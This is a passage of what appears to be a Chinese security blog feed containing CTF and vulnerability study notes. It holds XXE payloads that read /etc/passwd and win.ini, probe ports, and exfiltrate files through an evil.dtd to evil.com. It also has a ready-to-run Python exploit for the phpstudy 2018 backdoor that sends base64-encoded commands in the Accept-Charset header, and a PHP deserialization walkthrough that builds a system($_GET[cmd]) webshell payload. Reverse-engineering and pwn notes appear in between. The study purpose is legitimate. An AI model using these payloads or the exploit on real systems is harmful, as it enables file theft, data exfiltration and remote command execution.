class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p><p>外部实体 外部实体即在DTD中使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>实例演示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[ //定义一个外部名称</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;]&gt;</span> //SYSTEM "file:///xxxx" 用于读取文件</span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得带Content-Type: application/xml头，</p><p>如果请求头类似于：Content-Type: application/json，</p><p>那么可以改为Content-Type: application/xml试试有没有xml漏洞</p><h1 id="0x03-XXE漏洞实战">0x03 XXE漏洞实战</h1><p>题目地址：<a href="http://web.jarvisoj.com:9882" target="_blank" rel="noopener">web.jarvisoj.com:9882</a></p><p><img src="1.PNG" alt="1"></p><p>我们抓包看一下</p><p><img src="2.PNG" alt="2"></p><p>现在我们尝试把 <strong>Content-Type: application/json</strong> 改成 <strong>application/xml</strong></p><p>发送以下内容探测是否存在XXE</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE TEST [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY xxe "XXE TEST"&gt; //XXE Test是输出的内容 xxe可以为理解为一个变量</span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span> //乱取个名就好</span><br><span class="line">  &amp;xxe; //理解为引用变量地址输出</span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="3.PNG" alt="3"></p><p>读取文件测试</p><p><img src="4.PNG" alt="4"></p><p>读取flag测试</p><p><img src="5.PNG" alt="5"></p><h2 id="0x03-1-下面列出其他的用法">0x03.1 下面列出其他的用法</h2><p>XML文档是用PHP进行解析的，那么还可以使用php:*//filter协议来进行读取。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [ &lt;!ENTITY content SYSTEM "php://filter/resource=c:/windows/win.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>端口扫描 加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。 私有类型DTD加载：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">private_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">DTD_location</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>公共类型DTD加载：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">public_dtd</span> <span class="attr">PUBLIC</span> "<span class="attr">DTD_name</span>" "<span class="attr">DTD_location</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY portscan SYSTEM "http://localhost:3389"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;portscan;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>blind xxe漏洞: 对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p><p>利用DTD进行数据回显 有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"> <span class="meta">&lt;!DOCTYPE root[    </span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % file SYSTEM "php://fileter/convert.base64-encode/resource=c:/windows/win.ini"&gt;     </span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % dtd SYSTEM "http://192.168.1.100:8000/evil.dtd"&gt;    </span></span><br><span class="line"><span class="meta"> %dtd;     </span></span><br><span class="line"><span class="meta"> %send;]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">evil.dtd</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;"&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><p>在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容</p><h1 id="0x04-参考链接">0x04 参考链接</h1><blockquote><p>我个人认为讲的最好的链接：</p><p><a href="http://xz.aliyun.com/t/6887" target="_blank" rel="noopener">http://xz.aliyun.com/t/6887</a></p><hr><p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p><p><a href="https://www.cnblogs.com/vincebye/p/7199290.html" target="_blank" rel="noopener">https://www.cnblogs.com/vincebye/p/7199290.html</a></p><p><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a></p><p><a href="https://www.cnblogs.com/ESHLkangi/p/9245404.html" target="_blank" rel="noopener">https://www.cnblogs.com/ESHLkangi/p/9245404.html</a></p></blockquote><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF逆向</title>
      <link href="/2019/11/06/BugkuCTF%E9%80%86%E5%90%91/"/>
      <url>/2019/11/06/BugkuCTF%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-开言">0x00 开言</h1><p>最近了解了点逆向，pwn，汇编，C，C#等知识，开始试着刷题实战一下。</p><h2 id="0x00-1-环境-工具">0x00.1 环境&amp;工具</h2><p>工具： IDA &amp; OD</p><p>环境：Windows7</p><h2 id="0x00-2-需要注意的事项">0x00.2 需要注意的事项</h2><blockquote><p><strong>tips: 在windows下逆向需要注意，从windowsXP以上都有开启aslr保护，</strong></p><p>​<strong>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</strong></p></blockquote><h1 id="0x01-入门逆向">0x01 入门逆向</h1><p>使用ida打开发现没有任何值得，查看的。直接 按F5查看伪代码 再按R转码         就完事了.</p><p><img src="1.PNG" alt="1"></p><h1 id="0x02-Easy-vb">0x02 Easy_vb</h1><p>ida打开 直接往下看。看到flag</p><p><img src="1-1573024106714.PNG" alt="1"></p><h1 id="0x03-Easy-re">0x03 Easy_re</h1><p>这次使用 od工具 。直接上只能搜索看看。</p><p><img src="1-1573024191980.PNG" alt="1"></p><h1 id="0x04-游戏过关">0x04 游戏过关</h1><p>这一题比较难。</p><blockquote><p>需要用到的工具:</p><p>ida &amp; od</p></blockquote><h2 id="0x04-1-第一步-IDA">0x04.1 第一步 IDA</h2><p><strong>我们先用 ida 和 od 打开 程序</strong></p><p><img src="1-1573024519658.PNG" alt="1"></p><p><img src="2.PNG" alt="2"></p><p><strong>我们先看ida这边，先看shift+f12看看字符串</strong></p><p>发现字符串窗口有个 <strong>done!!!the flag is</strong>  这里是最后得出flag的地方，我们先不看他，往下翻</p><p><img src="3.PNG" alt="3"></p><p><img src="4.PNG" alt="4"></p><p>这次我们看到 <strong>Play a game\n</strong> 这里是程序的 开头言的地方。我们双击跳过去看看。</p><p><img src="5.PNG" alt="5"></p><p>这里有调用<strong>aPlayAGameTheNI</strong>函数。我们按<strong>x</strong>跳到，调用他的地方。</p><p>他跳到了最上面的窗口。我们往下翻</p><p><img src="6.PNG" alt="6"></p><p>看到 <strong>input n,n 这里 是让用户输入(1-8)的地方</strong>。我们按<strong>F5</strong>看看伪代码</p><p><img src="7.PNG" alt="7"></p><p>分析一下伪代码。</p><p><img src="8.PNG" alt="8"></p><p>我们看到这里是给用户循环输入的地方 有个断点sub_459418();。就是我们要跳转的地方.</p><p>我们现在回到之前看到 <strong>done!!! the flag is</strong> 地方 跳转过去看一看。</p><p><img src="9.PNG" alt="9"></p><p>看到有一个函数为 <strong>aDoneTheFlagIs</strong>,</p><p>我们打开一个选项，能直接查看到这个的 <strong>基址</strong></p><p><img src="10.PNG" alt="10"></p><p>我们往上翻，找到这个的Top位置</p><p><img src="11.PNG" alt="11"></p><p>这里。<strong>0045E940</strong>我们记下来这个<strong>基址</strong></p><p>再把</p><p><img src="12.PNG" alt="12"></p><p>sub_459418();这里的基址记下来。</p><h2 id="0x04-2-第二步-OD">0x04.2 第二步 OD</h2><p>现在我们回到 od</p><p><img src="13.PNG" alt="13"></p><p>先这个程序运行起来。点播放键(左上角)</p><p>然后我们点<strong>Ctrl+G</strong> 来跳转地址到<strong>0045E940</strong>地方。</p><p><img src="14.PNG" alt="14"></p><p>按F2设置断点。然后到程序里随便输入个数字(1-8),发现该程序运行到了</p><p><img src="15.PNG" alt="15"></p><p><strong>0045f515地址</strong>这里停住了，接下来我们用<strong>0045e940</strong>这个地址</p><p>双击0045f515地址，写上jmp 0045e940(jmp为汇编码，意思跳转)</p><p><img src="16.PNG" alt="16"></p><p><img src="17-1573025913557.PNG" alt="17"></p><p>更新程序运行。点到该程序的循环位置，为止。(0045EB51)</p><p><img src="18.PNG" alt="18"></p><p>白框的位置便是　ｗｈｉｌｅ循环的地方<br>我们在0045EBC1地址设置断点　使这个程序直接跳过ｗｈｉｌｅ循环<br>设置断点后　点继续运行程序</p><p><img src="19.PNG" alt="19"></p><p><img src="20.PNG" alt="20"></p><p>拿到flag!</p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Reverse-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Reverse-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Pwn】学习笔记第一期:栈知识</title>
      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-需要具备的知识">0x00 需要具备的知识</h1><h3 id="编译程序的内存分配">编译程序的内存分配</h3><h4 id="栈区-stack">栈区 (stack)</h4><p>函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。</p><h4 id="堆区-heap">堆区 (heap)</h4><p>一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。</p><h4 id="全局区-静态区static">全局区(静态区static)</h4><p>存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。</p><h4 id="常量区-文字常量区">常量区(文字常量区)</h4><p>存放常量字符串，程序结束后有系统释放。</p><h4 id="代码区">代码区</h4><p>存放函数体（类成员函数和全局区）的二进制代码。</p><h1 id="0x01-堆栈-stack-知识">0x01 堆栈(stack)知识</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="堆栈"></p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Pwn-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Pwn-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Pwn】学习笔记第零期:开端</title>
      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！</p><h1 id="0x01-需要具备的知识">0x01 需要具备的知识</h1><p>1.扎实的C基础<br>2.基本DS：链表、队列、栈<br>3.基本linux配置与命令<br>4.会汇编更好，不会的话现学几个常用的也可以救急。</p><h1 id="0x02-环境搭建">0x02 环境搭建</h1><p>使用的系统: ubuntu19</p><p>工具: python - pwntools</p><p>​  pwndbg</p><p>​  ida</p><p>​  gcc-multilib</p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Pwn-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Pwn-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy2018_backdoor_exp</title>
      <link href="/2019/10/17/phpstudy2018-backdoor-exp/"/>
      <url>/2019/10/17/phpstudy2018-backdoor-exp/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>前几个星期看到phpstudy带有后门程序。拖到现在才复现,看到可利用便立即写下利用脚本</p><h1 id="0x01-exp">0x01 exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Expoit</span><span class="params">(ip,exp)</span>:</span></span><br><span class="line">    payload = exp</span><br><span class="line">    pay = base64.b64encode(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span>,</span><br><span class="line">    <span class="string">"Accept-Charset"</span>: pay,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    print(headers)</span><br><span class="line">    url = ip</span><br><span class="line">    r = requests.get(url,headers=headers)</span><br><span class="line"></span><br><span class="line">Expoit(input(<span class="string">"target url&gt;"</span>),input(<span class="string">"payload&gt;"</span>))</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞学习</title>
      <link href="/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-写在前面">0x00 写在前面</h1><p>PHP反序列化漏洞虽然利用的条件比较苛刻，但是如果可以利用一般都会产生很严重的后果。在春招的时候很多公司都问过这个问题，说明这个反序列化漏洞的技能点也是很多公司比较关注的技能点。</p><h1 id="0x01-PHP反序列化漏洞">0x01 PHP反序列化漏洞</h1><p><strong>PHP反序列化漏洞</strong>,一直围绕着两个函数serialize() 和unserialize()</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize() <span class="comment">//是用于将类转换为一个字符串</span></span><br><span class="line">unserialize() <span class="comment">//用于将字符串转换回一个类</span></span><br></pre></td></tr></table></figure><h2 id="serialize">serialize()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fangxuliehua</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var1=<span class="string">"test for fangxuliehua"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$fangxuliehua = <span class="keyword">new</span> fangxuliehua();<span class="comment">//根据fangxuliehua类实列化对象</span></span><br><span class="line">$fangxueliehua_ser = serialize($fangxuliehua);</span><br><span class="line">print_r($fangxueliehua_ser);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="xueliehua1.jpg" alt="序列化"></p><p>我们这边创建了新的对象，并将他序列化打印出来。结果为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:"fangxuliehua":1:&#123;s:4:"var1";s:4:"test";&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里的<strong>O</strong>代表的是存储对象(Object),<strong>12</strong>则是12个字符，也就是存储对象里有12个字符。<strong>“fangxuliehua”<strong>则是对象的名称，这里的</strong>1</strong>则代表了**{s:4:“var1”;s:4:“test”;}** 里面有一个值。<strong>s</strong>表示字符串，<strong>4</strong>则长度。**“var1”**为字符串名字，后面的相同</p></blockquote><h2 id="unserialize">unserialize()</h2><p>与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fanguxliehua</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var1=<span class="string">"test"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class= <span class="string">'O:12:"fangxuliehua":1:&#123;s:4:"var1";s:4:"test";&#125;'</span>;</span><br><span class="line">print_r($class);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$class_unser=unserialize($class);</span><br><span class="line">print_r($class_unser);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="fangxuliehua2.jpg" alt="反序列化"></p><p><strong>tips:这里使用unserialize()时，会调用__wakeup()成员函数</strong></p><h1 id="0x02-反序列化漏洞产生原因">0x02 反序列化漏洞产生原因</h1><p>当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p><h1 id="0x03-利用函数构造PAYLOAD">0x03 利用函数构造PAYLOAD</h1><h3 id="Magic-function">Magic function</h3><p>php中有一类特殊的方法叫&quot;魔法函数&quot;(Magic function)， 这里我列出了与 php(反)序列化有关的几个魔法函数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创造时被调用</span></span><br><span class="line">__destruct()<span class="comment">//当对象被销毁时触发</span></span><br><span class="line">__wakeup()<span class="comment">//使用unserialize()时触发</span></span><br><span class="line">__sleep()<span class="comment">//使用serialize()时触发</span></span><br><span class="line">__toString()<span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__get()<span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set()<span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset()<span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset()<span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__invoke()<span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><p>这里我们着重关注一下几个：</p><ul><li><p>构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</p></li><li><p>析构函数__destruct()：当对象被销毁时会自动调用。</p></li><li><p>__wakeup() ：如前所提，unserialize()时会自动调用。</p></li></ul><p>代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $var=<span class="string">'123'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"序列化所调用的函数:"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$data=<span class="keyword">new</span> test();<span class="comment">//根据test类实列化对象</span></span><br><span class="line">$data=serialize($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"反序列化所调用的函数:"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$data1=unserialize($data);</span><br><span class="line">print_r($data1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="xuliehua3.jpg" alt="(反)序列化"></p><h3 id="利用示范">利用示范</h3><h4 id="wakeup-或-destruct">_wakeup() 或__destruct()</h4><p>前面说了利用都是基于“自动调用”的magic function。从而当我们控制序列化字符串时可以去直接触发它们。</p><p>这里针对 __wakeup() 场景做个实验。假设index源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $test = <span class="string">'test'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">$fp = fopen(<span class="string">"webshell.php"</span>,<span class="string">"w"</span>) ;</span><br><span class="line">fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class_get = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($class_get);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class_get_unser = unserialize($class_get);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"webshell.php"</span>) <span class="comment">//包含一下，让它能显示效果</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>webshell.php需要自己建立。在同目录下建立了一个webshell.php，最先访问index.php</p><p>基本思路是，通过<strong>serialize()<strong>得到我们想要的序列化字符串，之后再传进去。假设我们已知index.php源码。把对象中的</strong>$test</strong>赋值再调用<strong>unserialize()<strong>时会通过</strong>__wakeup()<strong>把</strong>$test</strong>的写入到shell.php中。</p><p>我们写个php脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $target=<span class="string">"&lt;?php $a=$_GET[cmd];system($a);?&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =serialize(<span class="keyword">new</span> payload);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>序列化后输出:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"payload"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">33</span>:<span 